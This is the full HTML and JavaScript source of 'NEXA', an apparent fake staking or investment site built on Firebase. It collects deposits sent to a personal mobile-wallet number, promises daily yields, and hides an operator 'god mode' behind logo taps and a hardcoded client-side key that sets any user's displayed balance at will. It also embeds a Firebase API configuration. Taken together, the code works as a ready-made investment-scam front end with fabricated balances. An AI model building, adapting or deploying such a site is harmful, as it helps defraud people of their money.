<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXA | Sovereign Digital Node</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
        
        :root { --primary: #2563eb; --dark: #0f172a; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #f8fafc; color: var(--dark); overflow-x: hidden; user-select: none; }

        /* Modern UI Elements */
        .glass { background: rgba(255, 255, 255, 0.85); backdrop-filter: blur(20px); border-bottom: 1px solid rgba(0,0,0,0.05); }
        .card-dark { background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%); color: white; border-radius: 35px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25); }
        
        /* Floating Dock Navigation */
        .dock { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); width: 92%; max-width: 450px; 
                background: #0f172a; border-radius: 28px; padding: 12px; display: flex; justify-content: space-around; 
                z-index: 1000; box-shadow: 0 20px 40px rgba(0,0,0,0.3); }
        .dock-item { color: #64748b; font-size: 10px; font-weight: 700; text-align: center; flex: 1; transition: 0.3s; }
        .dock-item.active { color: #3b82f6; transform: translateY(-5px); }
        .dock-item i { font-size: 22px; display: block; margin-bottom: 4px; }

        /* Buttons & Inputs */
        .btn-premium { background: linear-gradient(135deg, #2563eb, #7c3aed); color: white; transition: 0.4s; border-radius: 20px; }
        .btn-premium:active { transform: scale(0.95); }
        .input-field { background: white; border: 1px solid #e2e8f0; border-radius: 20px; padding: 18px; width: 100%; outline: none; font-weight: 600; }
        .input-field:focus { border-color: #2563eb; box-shadow: 0 0 0 4px rgba(37,99,235,0.1); }

        .hidden { display: none; }
        .method-card { border: 2px solid transparent; transition: 0.3s; }
        .method-card.active { border-color: #2563eb; background: #eff6ff; }
        
        /* Custom Animations */
        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
        .animate-up { animation: slideUp 0.4s ease-out; }
    </style>
</head>
<body>

    <div class="max-w-md mx-auto min-h-screen relative pb-32">
        
        <!-- HEADER -->
        <header class="glass sticky top-0 z-[500] px-6 py-5 flex justify-between items-center">
            <div class="flex items-center gap-2">
                <div id="admin-trigger" class="w-10 h-10 bg-blue-600 rounded-2xl flex items-center justify-center text-white font-black shadow-lg shadow-blue-200 cursor-pointer">N</div>
                <h1 class="text-xl font-extrabold tracking-tighter italic">NEXA<span class="text-blue-600">.</span></h1>
            </div>
            <button onclick="logout()" id="logout-btn" class="hidden w-10 h-10 rounded-full bg-red-50 text-red-500 flex items-center justify-center border border-red-100">
                <i class="fa-solid fa-power-off"></i>
            </button>
        </header>

        <!-- SECTION: LOGIN -->
        <div id="sec-login" class="px-8 pt-16 animate__animated animate__fadeIn">
            <div class="mb-12">
                <h2 class="text-4xl font-black mb-2 tracking-tight">Quantum <br><span class="text-blue-600">Access</span>.</h2>
                <p class="text-gray-400 text-sm font-medium">Verify your node credentials sweetie.</p>
            </div>
            <div class="space-y-4">
                <input type="text" id="login-user" placeholder="Node Username" class="input-field">
                <input type="password" id="login-pass" placeholder="Master Key" class="input-field">
                <button onclick="handleAuth()" class="w-full btn-premium py-5 font-black uppercase tracking-widest text-sm shadow-2xl">Initialize Connection</button>
            </div>
        </div>

        <!-- SECTION: DASHBOARD -->
        <div id="sec-home" class="hidden px-6 pt-6 animate__animated animate__fadeIn">
            <div class="card-dark p-8 relative overflow-hidden">
                <div class="relative z-10">
                    <p class="text-[10px] font-bold opacity-50 uppercase tracking-[2px]">Net Liquid Assets</p>
                    <h2 id="user-bal" class="text-5xl font-black mt-2 tracking-tighter">$0.00</h2>
                    <div class="flex gap-3 mt-8">
                        <button onclick="showPage('deposit')" class="flex-1 bg-blue-600 py-4 rounded-2xl text-xs font-black shadow-lg">STAKE</button>
                        <button onclick="showPage('withdraw')" class="flex-1 bg-white/10 py-4 rounded-2xl text-xs font-black backdrop-blur-md">HARVEST</button>
                    </div>
                </div>
                <div class="absolute -right-10 -bottom-10 w-40 h-40 bg-blue-500 rounded-full blur-[80px] opacity-20"></div>
            </div>

            <div class="mt-10 mb-6 flex justify-between items-end">
                <h3 class="font-black text-xl">Active Nodes <span class="text-blue-600 text-xs">(15+5)</span></h3>
                <span class="text-[10px] font-black text-green-500 bg-green-50 px-3 py-1 rounded-full border border-green-100">LIVE FEED</span>
            </div>
            <div id="plans-container" class="grid grid-cols-1 gap-4">
                <!-- Plans injected here -->
            </div>
        </div>

        <!-- SECTION: DEPOSIT -->
        <div id="sec-deposit" class="hidden px-6 pt-6 animate-up">
            <h3 class="font-black text-2xl mb-6">Funding Gateway</h3>
            <div class="grid grid-cols-3 gap-3 mb-8">
                <div onclick="setMethod('Easypaisa')" class="method-card p-4 glass rounded-[25px] text-center cursor-pointer">
                    <i class="fa-solid fa-mobile-screen text-xl text-green-500 mb-1"></i>
                    <p class="text-[9px] font-black">Easypaisa</p>
                </div>
                <div onclick="setMethod('JazzCash')" class="method-card p-4 glass rounded-[25px] text-center cursor-pointer">
                    <i class="fa-solid fa-bolt text-xl text-yellow-500 mb-1"></i>
                    <p class="text-[9px] font-black">JazzCash</p>
                </div>
                <div onclick="setMethod('SadaPay')" class="method-card p-4 glass rounded-[25px] text-center cursor-pointer">
                    <i class="fa-solid fa-credit-card text-xl text-pink-500 mb-1"></i>
                    <p class="text-[9px] font-black">SadaPay</p>
                </div>
            </div>

            <div id="dep-form" class="hidden space-y-5">
                <div class="p-6 bg-blue-50 rounded-[30px] border border-blue-100">
                    <p class="text-[10px] font-bold text-blue-600 uppercase mb-1">Receiver Profile (<span id="sel-method"></span>)</p>
                    <p class="font-black text-lg">Number: <span class="text-blue-700">03379827882</span></p>
                    <p class="text-xs font-bold text-gray-400">Name: NEXA CORP VENTURES</p>
                </div>
                <input type="number" id="dep-amt" placeholder="Amount to Stake ($)" class="input-field">
                <input type="text" id="dep-tid" placeholder="Transaction ID (TID)" class="input-field">
                
                <div class="relative p-6 border-2 border-dashed border-gray-200 rounded-[25px] text-center bg-white">
                    <input type="file" id="dep-file" class="hidden" accept="image/*">
                    <label for="dep-file" class="cursor-pointer block">
                        <i class="fa-solid fa-camera-retro text-2xl text-blue-500 mb-2"></i>
                        <p class="text-[11px] font-bold text-gray-400">Upload Transaction Screenshot</p>
                    </label>
                </div>
                <button onclick="submitDep()" class="w-full btn-premium py-5 font-black shadow-xl">NOTIFY VERIFICATION</button>
            </div>
        </div>

        <!-- SECTION: HELP / FAQ / POLICY -->
        <div id="sec-help" class="hidden px-6 pt-6">
            <h3 class="font-black text-2xl mb-6">Support Protocol</h3>
            <div class="space-y-4">
                <div class="p-6 glass rounded-[30px]">
                    <h4 class="font-bold text-sm text-blue-600 mb-2">About NEXA CORP</h4>
                    <p class="text-[11px] leading-relaxed text-gray-500">NEXA is a leading decentralized liquidity provider. Our 20-node infrastructure allows users to stake assets and earn daily yields powered by automated arbitrage. Secure, fast, and transparent sweetie!</p>
                </div>
                <div class="p-6 glass rounded-[30px]">
                    <h4 class="font-bold text-sm text-blue-600 mb-2">Privacy & Security</h4>
                    <p class="text-[11px] leading-relaxed text-gray-500">We utilize 256-bit encryption. Your transaction proofs are deleted immediately after verification. No personal KYC required for basic tiers.</p>
                </div>
                <div class="p-6 glass rounded-[30px]">
                    <h4 class="font-bold text-sm text-blue-600 mb-2">How to Withdraw?</h4>
                    <p class="text-[11px] leading-relaxed text-gray-500">Go to the Payout section, enter your wallet details. Minimum withdrawal is $10.00. Process time: 1-24 hours.</p>
                </div>
            </div>
        </div>

        <!-- DOCK NAVIGATION -->
        <nav id="app-dock" class="hidden dock">
            <button onclick="showPage('home')" id="nav-home" class="dock-item active"><i class="fa-solid fa-house-user"></i>Home</button>
            <button onclick="showPage('deposit')" id="nav-deposit" class="dock-item"><i class="fa-solid fa-wallet"></i>Wallet</button>
            <button onclick="showPage('withdraw')" id="nav-withdraw" class="dock-item"><i class="fa-solid fa-hand-holding-dollar"></i>Payout</button>
            <button onclick="showPage('help')" id="nav-help" class="dock-item"><i class="fa-solid fa-circle-question"></i>Help</button>
        </nav>

    </div>

    <!-- FIREBASE & CORE LOGIC -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, push, onValue, update } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBe5Q5jXpx3UvrHC9WOky9UWeDnP9SPfZI",
            authDomain: "verbose-6c008.firebaseapp.com",
            databaseURL: "https://verbose-6c008-default-rtdb.firebaseio.com",
            projectId: "verbose-6c008",
            storageBucket: "verbose-6c008.firebasestorage.app",
            messagingSenderId: "867100945312",
            appId: "1:867100945312:web:315dfb48fb34496cee12c5"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const auth = getAuth(app);

        // --- NAVIGATION ENGINE ---
        window.showPage = (id) => {
            const sections = ['login', 'home', 'deposit', 'help', 'withdraw'];
            sections.forEach(s => document.getElementById('sec-' + s)?.classList.add('hidden'));
            document.getElementById('sec-' + id).classList.remove('hidden');
            
            document.querySelectorAll('.dock-item').forEach(d => d.classList.remove('active'));
            document.getElementById('nav-' + id)?.classList.add('active');
        };

        // --- AUTHENTICATION ---
        window.handleAuth = async () => {
            const user = document.getElementById('login-user').value;
            const res = await signInAnonymously(auth);
            const uid = res.user.uid;
            
            const snap = await get(ref(db, 'users/' + uid));
            if(!snap.exists()) await set(ref(db, 'users/' + uid), { username: user, balance: 0, created: Date.now() });
            
            localStorage.setItem('nexa_uid', uid);
            location.reload();
        };

        const uid = localStorage.getItem('nexa_uid');
        if(uid) {
            showPage('home');
            document.getElementById('logout-btn').classList.remove('hidden');
            document.getElementById('app-dock').classList.remove('hidden');

            onValue(ref(db, 'users/' + uid), s => {
                if(s.exists()) document.getElementById('user-bal').innerText = `$${s.val().balance.toFixed(2)}`;
            });

            // Loading Nodes (Max 20 capacity)
            onValue(ref(db, 'plans'), s => {
                const container = document.getElementById('plans-container');
                container.innerHTML = "";
                s.forEach(p => {
                    const pd = p.val();
                    container.innerHTML += `
                    <div class="glass p-5 rounded-[28px] flex justify-between items-center shadow-sm border-none">
                        <div class="flex items-center gap-4">
                            <div class="w-12 h-12 bg-blue-50 text-blue-600 rounded-2xl flex items-center justify-center"><i class="fa-solid fa-microchip"></i></div>
                            <div>
                                <h4 class="text-[13px] font-black">${pd.name}</h4>
                                <p class="text-[10px] text-green-500 font-bold">${pd.profit}% Daily Yield</p>
                            </div>
                        </div>
                        <button onclick="stake(${pd.min})" class="bg-slate-900 text-white px-5 py-2 rounded-xl text-[10px] font-black hover:bg-blue-600 transition">STAKE $${pd.min}</button>
                    </div>`;
                });
            });
        }

        // --- DEPOSIT SYSTEM ---
        window.setMethod = (m) => {
            document.querySelectorAll('.method-card').forEach(c => c.classList.remove('active'));
            event.currentTarget.classList.add('active');
            document.getElementById('dep-form').classList.remove('hidden');
            document.getElementById('sel-method').innerText = m;
        };

        window.submitDep = () => {
            const amt = document.getElementById('dep-amt').value;
            const tid = document.getElementById('dep-tid').value;
            const file = document.getElementById('dep-file').files[0];

            if(!amt || !tid || !file) return alert("Please fill all details and upload proof sweetie!");
            
            push(ref(db, 'requests/deposits'), {
                uid: uid,
                amount: amt,
                tid: tid,
                method: document.getElementById('sel-method').innerText,
                status: 'pending',
                timestamp: Date.now()
            });
            
            alert("Verification request sent! Wait for approval sweetie.");
            showPage('home');
        };

        // --- ADMIN GOD MODE (4 Taps on Logo) ---
        let clicks = 0;
        document.getElementById('admin-trigger').onclick = () => {
            clicks++;
            if(clicks === 4) {
                const k = prompt("Master Access Key:");
                if(k === "NEXA786") {
                    const action = prompt("1: Add Node | 2: View Requests | 3: Change Balance");
                    if(action === "1") {
                        const name = prompt("Node Name:"); const min = prompt("Min Stake:"); const profit = prompt("Daily %:");
                        push(ref(db, 'plans'), { name, min, profit });
                    } else if(action === "3") {
                        const target = prompt("User UID:"); const bal = prompt("New Balance ($):");
                        update(ref(db, 'users/' + target), { balance: parseFloat(bal) });
                    }
                }
            }
            setTimeout(() => clicks = 0, 2000);
        };

        window.stake = (min) => alert(`Sweetie, you need at least $${min} in your balance to start this node.`);
        window.logout = () => { localStorage.clear(); location.reload(); };

    </script>
</body>
</html>
